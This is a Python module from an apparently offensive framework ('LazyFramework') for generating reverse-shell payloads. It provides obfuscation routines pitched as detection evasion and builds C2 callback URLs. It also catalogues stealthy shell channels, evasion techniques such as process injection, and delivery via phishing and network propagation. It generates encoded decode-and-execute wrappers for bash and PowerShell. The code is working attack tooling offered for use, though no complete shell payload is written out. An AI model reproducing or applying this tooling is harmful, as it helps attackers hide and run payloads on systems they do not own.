# /root/lazy1/modules/payloads/reverse/__init__.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Reverse Payloads Package
Mega comprehensive reverse shell collection with advanced features
"""

import base64
import random
import string
import hashlib
import zlib
from typing import Dict, Any, List, Tuple
from dataclasses import dataclass
from pathlib import Path

@dataclass
class PayloadConfig:
    """Configuration for payload generation"""
    lhost: str = "127.0.0.1"
    lport: int = 4444
    platform: str = "linux"
    arch: str = "x64"
    method: str = "tcp"
    encode: bool = False
    obfuscate: bool = False
    background: bool = False

class ReversePayloadGenerator:
    """Advanced reverse payload generator with evasion techniques"""
    
    # Common ports for different services
    COMMON_PORTS = {
        "web": [80, 443, 8080, 8443],
        "ssh": [22],
        "rdp": [3389],
        "ftp": [21],
        "dns": [53],
        "smb": [445, 139],
        "database": [1433, 1521, 3306, 5432],
        "mail": [25, 110, 143, 465, 587, 993, 995]
    }
    
    # Obfuscation techniques
    OBFUSCATION_METHODS = [
        "base64",
        "hex",
        "rot13", 
        "xor",
        "reverse",
        "compression"
    ]
    
    @staticmethod
    def generate_random_string(length: int = 8) -> str:
        """Generate random string for obfuscation"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    @staticmethod
    def generate_random_ip() -> str:
        """Generate random IP address for examples"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    @staticmethod
    def generate_random_port() -> int:
        """Generate random port number"""
        return random.randint(10000, 65535)
    
    @staticmethod
    def encode_base64(data: str, add_comments: bool = True) -> str:
        """Base64 encode with optional random comments for obfuscation"""
        encoded = base64.b64encode(data.encode()).decode()
        if add_comments and random.choice([True, False]):
            comment1 = ReversePayloadGenerator.generate_random_string(5)
            comment2 = ReversePayloadGenerator.generate_random_string(5)
            encoded = f"/*{comment1}*/{encoded}/*{comment2}*/"
        return encoded
    
    @staticmethod
    def encode_hex(data: str) -> str:
        """Hex encode data"""
        return data.encode().hex()
    
    @staticmethod
    def decode_hex(hex_data: str) -> str:
        """Hex decode data"""
        return bytes.fromhex(hex_data).decode()
    
    @staticmethod
    def rot13(data: str) -> str:
        """ROT13 encoding"""
        result = []
        for char in data:
            if 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result)
    
    @staticmethod
    def xor_encrypt(data: str, key: str = None) -> Tuple[str, str]:
        """Simple XOR encryption for payloads"""
        if key is None:
            key = ReversePayloadGenerator.generate_random_string(8)
        
        encrypted = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
        return encrypted, key
    
    @staticmethod
    def xor_decrypt(data: str, key: str) -> str:
        """XOR decryption"""
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
    
    @staticmethod
    def compress_data(data: str) -> str:
        """Compress data using zlib"""
        compressed = zlib.compress(data.encode())
        return base64.b64encode(compressed).decode()
    
    @staticmethod
    def decompress_data(compressed_data: str) -> str:
        """Decompress zlib compressed data"""
        compressed_bytes = base64.b64decode(compressed_data)
        return zlib.decompress(compressed_bytes).decode()
    
    @staticmethod
    def reverse_string(data: str) -> str:
        """Reverse string for obfuscation"""
        return data[::-1]
    
    @staticmethod
    def generate_http_c2_payload(lhost: str, lport: int, method: str = "http", path: str = "/c2") -> str:
        """Generate C2 communication payload"""
        if method == "http":
            return f"http://{lhost}:{lport}{path}"
        elif method == "https":
            return f"https://{lhost}:{lport}{path}"
        elif method == "dns":
            domain = ReversePayloadGenerator.generate_random_string(16)
            return f"{domain}.{lhost}"
        elif method == "ftp":
            return f"ftp://{lhost}:{lport}{path}"
    
    @staticmethod
    def obfuscate_payload(payload: str, method: str = "base64") -> Tuple[str, str]:
        """Obfuscate payload using specified method"""
        if method == "base64":
            return ReversePayloadGenerator.encode_base64(payload), "base64"
        elif method == "hex":
            return ReversePayloadGenerator.encode_hex(payload), "hex"
        elif method == "rot13":
            return ReversePayloadGenerator.rot13(payload), "rot13"
        elif method == "xor":
            obfuscated, key = ReversePayloadGenerator.xor_encrypt(payload)
            return obfuscated, f"xor:{key}"
        elif method == "reverse":
            return ReversePayloadGenerator.reverse_string(payload), "reverse"
        elif method == "compression":
            return ReversePayloadGenerator.compress_data(payload), "zlib"
        else:
            return payload, "none"
    
    @staticmethod
    def deobfuscate_payload(payload: str, method: str) -> str:
        """Deobfuscate payload"""
        if method == "base64":
            return base64.b64decode(payload).decode()
        elif method == "hex":
            return ReversePayloadGenerator.decode_hex(payload)
        elif method == "rot13":
            return ReversePayloadGenerator.rot13(payload)  # ROT13 is self-reversible
        elif method.startswith("xor:"):
            key = method.split(":")[1]
            return ReversePayloadGenerator.xor_decrypt(payload, key)
        elif method == "reverse":
            return ReversePayloadGenerator.reverse_string(payload)
        elif method == "zlib":
            return ReversePayloadGenerator.decompress_data(payload)
        else:
            return payload
    
    @staticmethod
    def generate_shell_commands(platform: str = "linux") -> Dict[str, str]:
        """Get shell commands for different platforms"""
        commands = {
            "linux": {
                "shell": "/bin/bash",
                "shell_alt": "/bin/sh",
                "download_curl": "curl -s",
                "download_wget": "wget -q -O-",
                "python": "python3",
                "perl": "perl",
                "php": "php",
                "nc": "nc",
                "socat": "socat"
            },
            "windows": {
                "shell": "cmd.exe",
                "shell_alt": "powershell.exe",
                "download_curl": "curl -s",
                "download_certutil": "certutil -urlcache -split -f",
                "download_bitsadmin": "bitsadmin /transfer",
                "python": "python",
                "perl": "perl",
                "php": "php",
                "nc": "nc"
            }
        }
        return commands.get(platform, commands["linux"])
    
    @staticmethod
    def get_platform_info(platform: str) -> Dict[str, Any]:
        """Get platform-specific information"""
        platforms = {
            "windows": {
                "name": "Windows",
                "default_shell": "cmd.exe",
                "architectures": ["x86", "x64"],
                "file_extensions": [".exe", ".bat", ".ps1", ".vbs"],
                "temp_dir": "%TEMP%"
            },
            "linux": {
                "name": "Linux/Unix",
                "default_shell": "/bin/bash",
                "architectures": ["x86", "x64", "arm", "arm64"],
                "file_extensions": [".sh", ".elf", ""],
                "temp_dir": "/tmp"
            },
            "macos": {
                "name": "macOS",
                "default_shell": "/bin/zsh",
                "architectures": ["x64", "arm64"],
                "file_extensions": [".sh", ".dmg", ""],
                "temp_dir": "/tmp"
            },
            "android": {
                "name": "Android",
                "default_shell": "/system/bin/sh",
                "architectures": ["arm", "arm64", "x86"],
                "file_extensions": [".apk", ".sh"],
                "temp_dir": "/data/local/tmp"
            }
        }
        return platforms.get(platform, platforms["linux"])
    
    @staticmethod
    def validate_ip_address(ip: str) -> bool:
        """Validate IP address format"""
        import socket
        try:
            socket.inet_pton(socket.AF_INET, ip)
            return True
        except socket.error:
            return False
    
    @staticmethod
    def validate_port(port: int) -> bool:
        """Validate port number"""
        return 1 <= port <= 65535
    
    @staticmethod
    def generate_payload_summary(payload: str, config: PayloadConfig) -> Dict[str, Any]:
        """Generate summary information about the payload"""
        return {
            "size_bytes": len(payload),
            "size_kb": round(len(payload) / 1024, 2),
            "lines": payload.count('\n') + 1,
            "platform": config.platform,
            "arch": config.arch,
            "method": config.method,
            "encoded": config.encode,
            "obfuscated": config.obfuscate,
            "background": config.background
        }
    
    @staticmethod
    def calculate_payload_hash(payload: str, algorithm: str = "md5") -> str:
        """Calculate hash of payload"""
        if algorithm == "md5":
            return hashlib.md5(payload.encode()).hexdigest()
        elif algorithm == "sha1":
            return hashlib.sha1(payload.encode()).hexdigest()
        elif algorithm == "sha256":
            return hashlib.sha256(payload.encode()).hexdigest()
        else:
            return hashlib.md5(payload.encode()).hexdigest()
    
    @staticmethod
    def generate_evasion_techniques() -> List[Dict[str, str]]:
        """Get list of evasion techniques"""
        return [
            {
                "name": "String Obfuscation",
                "description": "Obfuscate strings to avoid detection",
                "implementation": "xor, base64, hex encoding"
            },
            {
                "name": "Code Splitting", 
                "description": "Split payload into multiple parts",
                "implementation": "Multiple execution stages"
            },
            {
                "name": "Environmental Keying",
                "description": "Only execute in specific environments",
                "implementation": "Check hostname, username, etc."
            },
            {
                "name": "Time-based Execution",
                "description": "Execute only at specific times",
                "implementation": "Sleep delays, timed execution"
            },
            {
                "name": "Process Injection",
                "description": "Inject into legitimate processes",
                "implementation": "Reflective DLL injection, process hollowing"
            },
            {
                "name": "Polymorphic Code",
                "description": "Change code signature each execution",
                "implementation": "Dynamic code generation"
            }
        ]
    
    @staticmethod
    def get_reverse_shell_methods(platform: str) -> List[Dict[str, Any]]:
        """Get available reverse shell methods for platform"""
        base_methods = [
            {
                "name": "TCP",
                "description": "Standard TCP reverse shell",
                "reliability": "High",
                "stealth": "Low",
                "requirements": "Network connectivity"
            },
            {
                "name": "UDP", 
                "description": "UDP-based reverse shell",
                "reliability": "Medium",
                "stealth": "Medium", 
                "requirements": "UDP connectivity"
            },
            {
                "name": "HTTP",
                "description": "HTTP tunneled reverse shell",
                "reliability": "High",
                "stealth": "Medium",
                "requirements": "HTTP/HTTPS outbound"
            },
            {
                "name": "DNS",
                "description": "DNS tunneled reverse shell", 
                "reliability": "Medium",
                "stealth": "High",
                "requirements": "DNS resolution"
            },
            {
                "name": "ICMP",
                "description": "ICMP-based covert channel",
                "reliability": "Low", 
                "stealth": "High",
                "requirements": "ICMP echo, root privileges"
            }
        ]
        
        # Platform-specific additions
        if platform == "windows":
            base_methods.extend([
                {
                    "name": "SMB",
                    "description": "SMB named pipe communication",
                    "reliability": "High", 
                    "stealth": "Medium",
                    "requirements": "SMB outbound"
                },
                {
                    "name": "COM",
                    "description": "Component Object Model",
                    "reliability": "Medium",
                    "stealth": "High",
                    "requirements": "Windows COM"
                }
            ])
        
        return base_methods
    
    @staticmethod
    def generate_delivery_methods() -> List[Dict[str, str]]:
        """Get payload delivery methods"""
        return [
            {
                "name": "Direct Execution",
                "description": "Execute payload directly on target",
                "command": "Copy/paste or direct execution"
            },
            {
                "name": "File Download",
                "description": "Download and execute from remote server",
                "command": "curl/wget/certutil download"
            },
            {
                "name": "Phishing",
                "description": "Deliver via email attachment",
                "command": "Macro, attachment, link"
            },
            {
                "name": "Physical Access", 
                "description": "Direct physical execution",
                "command": "USB, CD/DVD, direct input"
            },
            {
                "name": "Network Propagation",
                "description": "Spread through network shares",
                "command": "SMB, RDP, SSH"
            },
            {
                "name": "Web Delivery", 
                "description": "Serve via web server",
                "command": "Python HTTP server, Apache, Nginx"
            }
        ]

# Utility functions for payload modules
def format_payload_display(payload: str, title: str = "Payload") -> str:
    """Format payload for display with proper formatting"""
    if len(payload) > 1000:
        return f"{payload[:500]}...\n...{payload[-500:]}"
    return payload

def validate_payload_parameters(lhost: str, lport: int) -> Tuple[bool, str]:
    """Validate common payload parameters"""
    if not ReversePayloadGenerator.validate_ip_address(lhost):
        return False, f"Invalid IP address: {lhost}"
    
    if not ReversePayloadGenerator.validate_port(lport):
        return False, f"Invalid port number: {lport}"
    
    return True, "Parameters valid"

def generate_payload_variants(base_payload: str, platform: str) -> Dict[str, str]:
    """Generate multiple variants of a payload"""
    variants = {}
    
    # Original
    variants["original"] = base_payload
    
    # Base64 encoded
    variants["base64"] = ReversePayloadGenerator.encode_base64(base_payload)
    
    # Hex encoded  
    variants["hex"] = ReversePayloadGenerator.encode_hex(base_payload)
    
    # Compressed
    variants["compressed"] = ReversePayloadGenerator.compress_data(base_payload)
    
    # Platform-specific variants
    if platform == "windows":
        variants["powershell_encoded"] = f"powershell -Enc {ReversePayloadGenerator.encode_base64(base_payload)}"
        variants["cmd_encoded"] = f"cmd /c echo {ReversePayloadGenerator.encode_base64(base_payload)} | base64 -d | cmd"
    
    elif platform == "linux":
        variants["bash_encoded"] = f"echo '{ReversePayloadGenerator.encode_base64(base_payload)}' | base64 -d | bash"
        variants["sh_encoded"] = f"echo '{ReversePayloadGenerator.encode_base64(base_payload)}' | base64 -d | sh"
    
    return variants

# Export commonly used classes and functions
__all__ = [
    'ReversePayloadGenerator',
    'PayloadConfig', 
    'format_payload_display',
    'validate_payload_parameters',
    'generate_payload_variants'
]

# Module version information
__version__ = "1.0.0"
__author__ = "LazyFramework Team"
__description__ = "Advanced Reverse Payload Generation Framework"

if __name__ == "__main__":
    # Test the module
    generator = ReversePayloadGenerator()
    test_payload = "echo 'Hello World'"
    
    print("🔧 Reverse Payload Generator Test")
    print("=" * 40)
    
    # Test obfuscation methods
    for method in ReversePayloadGenerator.OBFUSCATION_METHODS:
        obfuscated, key = generator.obfuscate_payload(test_payload, method)
        print(f"{method.upper():>10}: {obfuscated[:50]}...")
    
    # Test platform info
    print(f"\n📋 Platform Information:")
    for platform in ["windows", "linux", "macos"]:
        info = generator.get_platform_info(platform)
        print(f"  {platform}: {info['name']} ({info['default_shell']})")
    
    print(f"\n✅ Module loaded successfully - Version {__version__}")
